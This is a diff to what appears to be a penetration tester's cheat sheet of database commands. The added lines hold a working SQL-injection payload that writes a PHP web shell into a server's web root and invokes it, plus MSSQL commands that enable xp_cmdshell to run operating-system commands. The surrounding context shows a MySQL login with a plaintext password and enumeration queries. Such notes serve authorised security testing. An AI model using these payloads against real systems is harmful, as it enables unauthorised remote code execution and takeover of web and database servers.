@@ -18,6 +18,10 @@
 ##############
 ####### MySQL
 ##############
+RCE:
+' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
+$ Write webshell.php inside server
+webshell.php?cmd=whoami
 
 mysql -u dbadmin -p'dbpass' -h 10.0.0.1 -P 3306
 select version();
@@ -40,3 +44,10 @@ SELECT @@version;
 SELECT name FROM sys.databases;
 SELECT * FROM user01.information_schema.tables;
 select * from user01.dbo.users;
+
+### Enable XP-CMDShell
+EXECUTE sp_configure 'show advanced options', 1;
+RECONFIGURE;
+EXECUTE sp_configure 'xp_cmdshell', 1;
+EXECUTE xp_cmdshell 'whoami';
+RECONFIGURE;
